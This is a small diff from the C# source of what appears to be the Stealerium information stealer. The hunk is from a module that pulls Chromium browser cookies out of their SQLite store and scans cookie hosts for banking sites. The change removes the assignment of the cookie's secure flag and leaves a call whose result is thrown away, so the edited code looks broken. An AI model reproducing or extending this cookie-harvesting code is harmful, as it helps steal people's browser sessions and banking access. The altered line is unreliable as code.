@@ -36,7 +36,7 @@ namespace Stealerium.Target.Browsers.Chromium
                     cCookie.Name = Crypto.GetUtf8(sSqLite.GetValue(i, 2));
                     cCookie.Path = Crypto.GetUtf8(sSqLite.GetValue(i, 4));
                     cCookie.ExpiresUtc = Crypto.GetUtf8(sSqLite.GetValue(i, 5));
-                    cCookie.IsSecure = Crypto.GetUtf8(sSqLite.GetValue(i, 6).ToUpper());
+                    Crypto.GetUtf8(sSqLite.GetValue(i, 6).ToUpper());
 
                     // Analyze value
                     Banking.ScanData(cCookie.HostKey);
